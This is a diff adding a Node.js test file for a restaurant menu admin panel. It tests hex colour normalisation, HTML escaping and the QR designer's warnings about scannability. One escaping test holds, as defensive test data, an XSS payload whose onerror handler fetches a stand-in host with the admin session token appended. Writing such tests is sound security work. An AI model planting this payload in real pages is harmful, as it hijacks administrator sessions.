@@ -1,0 +1,150 @@
+// Funciones que viven en el HTML del panel y en qr.js. No son módulos, así
+// que se extraen del fuente y se evalúan: así se prueba el código que se
+// despliega y no una copia que puede quedarse atrás.
+const { test, describe } = require('node:test');
+const assert = require('node:assert/strict');
+const fs = require('fs');
+const path = require('path');
+const vm = require('vm');
+
+const PUBLIC = path.join(__dirname, '..', 'public');
+
+// Extrae el trozo de fuente entre dos marcas y lo evalúa en un contexto con
+// los stubs que necesite.
+function cargar(archivo, desde, hasta, contexto = {}) {
+	const src = fs.readFileSync(path.join(PUBLIC, archivo), 'utf8');
+	const i = src.indexOf(desde);
+	const f = hasta ? src.indexOf(hasta, i) : src.length;
+	assert.notEqual(i, -1, `no se encontró "${desde}" en ${archivo} — ¿se renombró?`);
+	const ctx = vm.createContext(contexto);
+	vm.runInContext(src.slice(i, f), ctx);
+	return ctx;
+}
+
+// ═══════════════════════════════════════════════════════════════
+describe('hex6 · normaliza colores para el selector nativo', () => {
+	const { hex6 } = cargar('index.html', 'function hex6', '// El cuadrito y el campo');
+
+	test('expande los hex de tres dígitos', () => {
+		// <input type="color"> solo admite #rrggbb: un #abc lo dejaría en
+		// negro y el cuadrito no coincidiría con lo escrito.
+		assert.equal(hex6('#abc'), '#aabbcc');
+		assert.equal(hex6('#AABBCC'), '#aabbcc');
+	});
+
+	test('acepta las formas razonables de escribir un color', () => {
+		assert.equal(hex6('#ffd521'), '#ffd521');
+		assert.equal(hex6('ffd521'), '#ffd521', 'sin almohadilla');
+		assert.equal(hex6('  #ffd521  '), '#ffd521', 'con espacios');
+	});
+
+	test('lo inválido conserva el valor anterior, no salta a negro', () => {
+		// Si saltara a negro, el diseño se movería solo mientras alguien
+		// termina de teclear el color.
+		for (const malo of ['#12345', 'rojo', '', null, undefined, '#zzzzzz'])
+			assert.equal(hex6(malo, '#e91e63'), '#e91e63', `con ${JSON.stringify(malo)}`);
+	});
+
+	test('los colores que la plataforma usa hoy pasan intactos', () => {
+		for (const c of ['#ffd521', '#f5a623', '#cdfefe', '#a374af', '#3d568c',
+		                 '#3dd68c', '#12111a', '#1a1825', '#0a0a0f', '#000000', '#ffffff'])
+			assert.equal(hex6(c), c);
+	});
+});
+
+// ═══════════════════════════════════════════════════════════════
+describe('esc · escapado en el panel', () => {
+	const { esc } = cargar('index.html', 'function esc(s)', 'let token =');
+
+	test('el nombre de un producto no puede inyectar código', () => {
+		// Importa más que en el menú público: el superadmin abre el panel de
+		// CUALQUIER restaurante y su sesión vive en sessionStorage.
+		const payload = '<img src=x onerror="fetch(\'//evil/\'+sessionStorage.menuAdminToken)">';
+		const salida = esc(payload);
+		assert.ok(!/<[a-zA-Z]/.test(salida), 'no debe quedar ninguna etiqueta');
+		assert.ok(!salida.includes('"'), 'no debe quedar comilla que abra un atributo');
+	});
+
+	test('un nombre normal se muestra igual', () => {
+		assert.equal(esc('HAMBURGUESA'), 'HAMBURGUESA');
+		assert.equal(esc("PA' QUE NO JODA"), 'PA&#39; QUE NO JODA');
+	});
+
+	test('nulo no imprime la palabra "null"', () => {
+		assert.equal(esc(null), '');
+		assert.equal(esc(undefined), '');
+	});
+});
+
+// ═══════════════════════════════════════════════════════════════
+describe('Diseñador de QR · avisos de escaneabilidad', () => {
+	// qrRevisarAvisos y qrLeerControles leen del DOM; se les da uno falso.
+	function preparar(cfgPrevia, entradas) {
+		const campos = {
+			qrColorFg:   { value: entradas.fg ?? '#000000' },
+			qrColorOjos: { value: entradas.ojos ?? '' },
+			qrColorBg:   { value: entradas.bg ?? '#ffffff' },
+			qrCartelBg:  { value: '#111111' },
+			qrCartelFg:  { value: '#ffffff' },
+			qrTransparente: { checked: false },
+			qrUsarLogo:  { checked: false },
+			qrLogoTam:   { value: '22' },
+			qrMargen:    { value: String(entradas.margen ?? 4) },
+			qrCartelTitulo: { value: '' },
+			qrCartelPie: { value: '' },
+			qrAviso:     { textContent: '', style: {} },
+		};
+		const ctx = cargar('qr.js', 'const QR_HEX_RE', 'function qrElegirEstilo', {
+			qrCfg: { ...cfgPrevia },
+			document: { getElementById: id => campos[id] || null },
+		});
+		ctx.qrLeerControles();
+		ctx.qrRevisarAvisos();
+		return { aviso: campos.qrAviso.textContent, cfg: ctx.qrCfg };
+	}
+
+	test('un color mal escrito avisa y conserva el anterior', () => {
+		// Canvas ignora en silencio un fillStyle inválido y se queda con el
+		// del fondo: el QR salía en blanco sin que nada lo dijera.
+		const { aviso, cfg } = preparar({ fg: '#e91e63', bg: '#ffffff' }, { fg: '#12345' });
+		assert.match(aviso, /Color no válido/);
+		assert.equal(cfg.fg, '#e91e63', 'no se pierde el color que ya funcionaba');
+	});
+
+	test('nombra los campos concretos que están mal', () => {
+		const { aviso } = preparar({ fg: '#000000', bg: '#ffffff' }, { fg: 'rojo', bg: 'blanco' });
+		assert.match(aviso, /los puntos y el fondo/);
+	});
+
+	test('los formatos válidos no se marcan como inválidos', () => {
+		// Ojo: #abc es #aabbcc, un azul claro que sobre blanco sí dispara el
+		// aviso de contraste. Eso es correcto; aquí solo interesa que no se
+		// le acuse de estar mal escrito.
+		for (const [entradas, etiqueta] of [
+			[{ fg: '#abc' }, 'hex de 3 dígitos'],
+			[{ fg: '#AABBCC' }, 'mayúsculas'],
+			[{ ojos: '' }, 'esquinas vacío = igual que los puntos'],
+			[{ fg: '#000000' }, 'hex completo'],
+		]) assert.doesNotMatch(preparar({}, entradas).aviso, /Color no válido/, etiqueta);
+	});
+
+	test('un margen por debajo de la norma avisa', () => {
+		// La norma del QR pide 4 módulos de zona de silencio; con menos,
+		// muchos lectores fallan impreso junto a otros elementos.
+		assert.match(preparar({}, { margen: 0 }).aviso, /Margen de 0 módulos/);
+		assert.match(preparar({}, { margen: 1 }).aviso, /Margen de 1 módulo\b/, 'singular');
+		assert.doesNotMatch(preparar({}, { margen: 4 }).aviso, /Margen/);
+		assert.doesNotMatch(preparar({}, { margen: 8 }).aviso, /Margen/);
+	});
+
+	test('el aviso de contraste sigue funcionando', () => {
+		assert.match(preparar({}, { fg: '#ffffff', bg: '#000000' }).aviso, /claro sobre fondo oscuro/);
+		assert.match(preparar({}, { fg: '#777777', bg: '#888888' }).aviso, /poco contraste/);
+		assert.equal(preparar({}, { fg: '#000000', bg: '#ffffff', margen: 4 }).aviso, '', 'negro sobre blanco, sin avisos');
+	});
+
+	test('varios problemas se listan juntos, no se pisan', () => {
+		const { aviso } = preparar({ fg: '#000000' }, { fg: '###', margen: 0 });
+		assert.ok(aviso.split('\n').length >= 2, 'debe verlos todos de una vez');
+	});
+});
